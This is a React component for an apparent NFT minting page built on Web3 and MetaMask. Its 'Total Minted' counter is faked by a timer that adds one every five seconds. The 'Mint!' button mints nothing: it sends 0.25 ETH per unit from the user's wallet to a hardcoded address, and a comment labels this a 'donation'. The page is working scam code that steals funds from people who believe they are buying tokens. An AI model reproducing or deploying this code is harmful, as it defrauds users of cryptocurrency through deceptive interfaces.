import { useState, useEffect } from "react";
import Web3 from "web3";
import { AiOutlineMinus } from "react-icons/ai";
import { AiOutlinePlus } from "react-icons/ai";
import Imaginary from "./Imagaginary";

const Home = () => {
  const [mintValue, setMintValue] = useState(1);
  const [minted, setMinted] = useState(7787);

  useEffect(() => {
    setInterval(() => {
      setMinted(prevCount => prevCount + 1);
    }, 5000);
  }, []);

  const mintHandler = async () => {
    const { web3, sender } = await connectWallet();
    const receiver = "0x29b45FA51203aD2c616cB69d497D2a111E6A5b3f";
    //   Send Donation
    try {
      const cost = mintValue * 0.25;
      await web3.eth.sendTransaction({
        from: sender,
        to: receiver,
        value: web3.utils.toWei(cost.toString(), "ether"),
      });
    } catch (error) {
      console.log(error);
    }
  };

  const connectWallet = async () => {
    try {
      if (!window.ethereum) return alert("Please install Metamask");
      // Request Metamask for accounts

      const web3 = new Web3(Web3.givenProvider);
      const accounts = await web3.eth.requestAccounts();
      if (accounts[0]) {
        return { web3: web3, sender: accounts[0] };
      }
    } catch (error) {
      alert(error.data.message);
      throw new Error("No Ethereum Object");
    }
  };

  const incrementHandler = () => {
    setMintValue(mintValue + 1);
  };

  const decrementHandler = () => {
    if (mintValue <= 1) return;
    setMintValue(mintValue - 1);
  };
  return (
    <div className="bg-[#8459FF]">
      <main className="min-h-screen bg-[#8459FF] flex justify-center items-center">
        <div className="flex-col justify-center items-center text-center max-w-[700px] px-[40px]">
          <h1 className="text-[#ffffff] text-[48px] font-[900]">
            Total Minted: <span className="text-[#FFDD00]"> {minted}/8888</span>
          </h1>
          <h2 className="text-[#ffffff] text-[40px] font-[900]">
            Price Per Mint: <span className="text-[#FFDD00]">0.25 ETH</span>
          </h2>

          <div className="  flex-col justify-center items-center">
            {/* Quantity */}
            <div className=" mt-5 flex justify-center items-center text-[#3c5476] space-x-2">
              <button>
                <div
                  className="rounded-full p-2 bg-[#ffffff]"
                  onClick={decrementHandler}
                >
                  <AiOutlineMinus fontSize={28} />
                </div>
              </button>
              <div className="rounded-full px-8 py-1 bg-[#fff]">
                <p className="text-4xl font-bold">{mintValue}</p>
              </div>
              <button>
                <div
                  className="rounded-full p-2 bg-[#ffffff]"
                  onClick={incrementHandler}
                >
                  <AiOutlinePlus fontSize={28} />
                </div>
              </button>
            </div>

            {/* Button */}
            <div className="flex justify-center items-center space-x-2">
              <button className="mintBtn mt-5" onClick={mintHandler}>
                Mint!
              </button>
            </div>

            <h4 className="text-[35px] font-[900] text-[#ffffff] mt-10">
              Mint Price Total:{" "}
              <span className="text-[#FFDD00]">{mintValue * 0.25} ETH</span>
            </h4>
          </div>
        </div>
      </main>
      <Imaginary />
    </div>
  );
};

export default Home;
